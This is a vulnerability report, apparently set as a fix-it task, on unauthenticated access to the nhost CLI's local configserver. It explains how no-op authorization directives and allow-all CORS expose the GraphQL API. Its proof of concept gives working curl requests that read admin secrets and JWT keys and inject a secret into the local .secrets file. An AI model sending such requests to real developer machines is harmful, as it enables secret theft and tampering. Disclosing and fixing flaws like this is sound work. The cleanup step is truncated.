# Security finding

> A code-security scan flagged the vulnerability below. No remediation is included; produce the fix yourself.

**Type:** Missing Authentication — CWE-306
**Project:** `nhost/nhost`
**Primary location:** `cli/clienv/appid.go`
**Other files possibly involved:** `cli/clienv/filesystem.go`, `cli/cmd/configserver/configserver.go`, `cli/cmd/configserver/local.go`, `cli/cmd/dev/cloud.go`, `cli/cmd/dev/up.go`

## Details

### Summary

The hidden `nhost configserver` used by `nhost dev` exposes the Mimir GraphQL API with dummy authorization directives and permissive CORS. When a developer is running the local development environment, any process that can reach the developer's localhost service, including a web page loaded from an arbitrary origin, can query the configserver for local Nhost configuration and secrets and can mutate the local `.secrets` file.

This impacts developers using `nhost dev`: project admin secrets, JWT signing keys, webhook secrets, Grafana credentials, and custom environment variables can be read, and attacker-controlled secrets can be written to the local development project.

### Details

The CLI registers a hidden `configserver` command in `cli/main.go:39` and `cli/main.go:41`. That command is used as the local development configserver image in `nhost dev`: `cli/cmd/dev/up.go:176` through `cli/cmd/dev/up.go:200` select `nhost/cli:<version>` as the configserver image, and `cli/dockercompose/configserver.go:80` through `cli/dockercompose/configserver.go:84` run it with the `configserver` command. The generated development dashboard receives the configserver and logs GraphQL URLs in public client-side environment variables at `cli/dockercompose/compose.go:347` through `cli/dockercompose/compose.go:358`.

The configserver intentionally loads the local project files into Mimir's GraphQL resolver in `cli/cmd/configserver/configserver.go:143` through `cli/cmd/configserver/configserver.go:156`. However, the authorization directives passed to `graph.SetupRouter` are no-ops:

- `cli/cmd/configserver/configserver.go:83` through `cli/cmd/configserver/configserver.go:89` define `dummyMiddleware`, which calls the next resolver without checking app visibility.
- `cli/cmd/configserver/configserver.go:91` through `cli/cmd/configserver/configserver.go:98` define `dummyMiddleware2`, which calls the next resolver without checking roles.
- `cli/cmd/configserver/configserver.go:161` through `cli/cmd/configserver/configserver.go:170` pass those dummy directive handlers and `cors.Default()` to the GraphQL router.

The default `rs/cors` configuration allows all origins when no `AllowedOrigins` are specified: `vendor/github.com/rs/cors/cors.go:163` through `vendor/github.com/rs/cors/cors.go:167`, and `vendor/github.com/rs/cors/cors.go:248` through `vendor/github.com/rs/cors/cors.go:249` show `Default()` uses `Options{}`. A browser preflight from an arbitrary origin receives `Access-Control-Allow-Origin: *`.

The exposed GraphQL schema includes sensitive queries and mutations:

- `vendor/github.com/nhost/be/services/mimir/schema/schema.graphqls:41` through `vendor/github.com/nhost/be/services/mimir/schema/schema.graphqls:57` expose `configRawJSON`, `config`, and `appSecrets` by app ID. `appSecrets` is protected only by `@hasAppVisibility`, which the configserver replaces with the no-op `dummyMiddleware`.
- `vendor/github.com/nhost/be/services/mimir/schema/schema.graphqls:117` through `vendor/github.com/nhost/be/services/mimir/schema/schema.graphqls:128` expose `insertSecret`, `updateSecret`, and `deleteSecret`, also protected only by the no-op `@hasAppVisibility` directive.
- `vendor/github.com/nhost/be/services/mimir/graph/q_app_secrets.go:10` through `vendor/github.com/nhost/be/services/mimir/graph/q_app_secrets.go:30` return the app's secrets.
- `vendor/github.com/nhost/be/services/mimir/graph/q_config_raw_json.go:12` returns raw JSON for the app configuration, which includes sensitive fields such as Hasura admin secrets and JWT signing keys in local development config.
- `vendor/github.com/nhost/be/services/mimir/graph/m_insert_secret.go:11` through `vendor/github.com/nhost/be/services/mimir/graph/m_insert_secret.go:47` append attacker-supplied secrets and call plugin `UpdateSecrets`.
- `cli/cmd/configserver/local.go:164` through `cli/cmd/configserver/local.go:175` marshal the new secrets and write them to the configured local secrets file with `os.WriteFile`.

Because the local configserver uses a fixed zero UUID app ID for the local app (`cli/cmd/configserver/local.go:134`) and does not require cookies, tokens, or admin headers, a request only needs the known GraphQL endpoint and app ID.

Candidate score: 14/14.

- Reachability: 2 — reachable in the documented local development path using `nhost dev` and directly through the hidden `configserver` command.
- Attacker control: 2 — GraphQL query and mutation bodies are fully attacker-controlled.
- Privilege required: 2 — no authentication or local Nhost privileges are required beyond network/browser reachability to the developer's local configserver.
- Sink impact: 2 — sensitive secret read and local secrets file write.
- Mitigation weakness: 2 — role/app-visibility directives are replaced with no-op handlers, and CORS permits all origins.
- Default exposure: 2 — enabled by the common local development setup.
- Safe reproduction feasibility: 2 — confirmed locally with disposable fixture files.

### PoC

The following proof uses only localhost and disposable temporary files. It does not contact external systems and does not read or modify real project secrets.

1. Start a configserver instance against temporary local files:

```sh
tmpdir=$(mktemp -d)
config="$tmpdir/nhost.toml"
secrets="$tmpdir/.secrets"

cat > "$config" <<'EOF'
[hasura]
adminSecret = 'local-test-admin-secret'
webhookSecret = 'local-test-webhook-secret'

[[hasura.jwtSecrets]]
type = 'HS256'
key = 'local-test-jwt-secret'

[observability]
[observability.grafana]
adminPassword = 'local-test-grafana-password'
EOF

cat > "$secrets" <<'EOF'
localProofSecret = 'LOCAL_PROOF_SECRET_VALUE'
EOF

port=18088
go run ./cli configserver \
  --bind "127.0.0.1:$port" \
  --storage-local-config-path "$config" \
  --storage-local-secrets-path "$secrets"
```

2. From another shell, show that a browser-style preflight from an arbitrary origin is accepted:

```sh
curl -sS -i -X OPTIONS \
  -H 'Origin: https://attacker.example' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type' \
  "http://127.0.0.1:18088/v1/configserver/graphql"
```

Observed proof output in this environment:

```text
HTTP/1.1 204 No Content
Access-Control-Allow-Headers: content-type
Access-Control-Allow-Methods: POST
Access-Control-Allow-Origin: *
Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
```

3. Read local development secrets without any authentication:

```sh
curl -sS -i \
  -H 'Origin: https://attacker.example' \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { appSecrets(appID: \"00000000-0000-0000-0000-000000000000\") { name value } }"}' \
  "http://127.0.0.1:18088/v1/configserver/graphql"
```

Observed proof output in this environment:

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
{"data":{"appSecrets":[{"name":"localProofSecret","value":"LOCAL_PROOF_SECRET_VALUE"}]}}
```

4. Read sensitive local configuration without any authentication:

```sh
curl -sS -i \
  -H 'Origin: https://attacker.example' \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { configRawJSON(appID: \"00000000-0000-0000-0000-000000000000\", resolve: false) }"}' \
  "http://127.0.0.1:18088/v1/configserver/graphql"
```

Observed proof output in this environment:

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
{"data":{"configRawJSON":"{\"hasura\":{\"adminSecret\":\"local-test-admin-secret\",\"jwtSecrets\":[{\"key\":\"local-test-jwt-secret\",\"type\":\"HS256\"}],\"webhookSecret\":\"local-test-webhook-secret\"},\"observability\":{\"grafana\":{\"adminPassword\":\"local-test-grafana-password\"}}}"}}
```

5. Mutate the local `.secrets` file without any authentication:

```sh
curl -sS -i \
  -H 'Origin: https://attacker.example' \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { insertSecret(appID: \"00000000-0000-0000-0000-000000000000\", secret: { name: \"INJECTED_BY_UNAUTHENTICATED_REQUEST\", value: \"SAFE_LOCAL_MARKER\" }) { name value } }"}' \
  "http://127.0.0.1:18088/v1/configserver/graphql"

grep -E 'INJECTED_BY_UNAUTHENTICATED_REQUEST|SAFE_LOCAL_MARKER' "$secrets"
```

Observed proof output in this environment:

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
{"data":{"insertSecret":{"name":"INJECTED_BY_UNAUTHENTICATED_REQUEST","value":"SAFE_LOCAL_MARKER"}}}
INJECTED_BY_UNAUTHENTICATED_REQUEST = 'SAFE_LOCAL_MARKER'
```

6. Cleanup:

```sh
### Impact

An attacker who can cause a developer to visit a web page while `nhost dev` is running can use JavaScript from that page to send cross-origin GraphQL requests to the local Nhost configserver. The attacker can read local development secrets and configuration, including Hasura admin secrets, JWT signing keys, webhook secrets, Grafana credentials, and custom environment variables stored in `.secrets`. The attacker can also mutate the local `.secrets` file, which can alter subsequent local development behavior and potentially poison local configuration consumed by services.

This is not a hosted-production unauthenticated endpoint vulnerability; it affects the local developer environment. The realistic attacker model is a malicious web page, local unprivileged process, or same-network process that can reach the developer's local configserver route while the development stack is running.
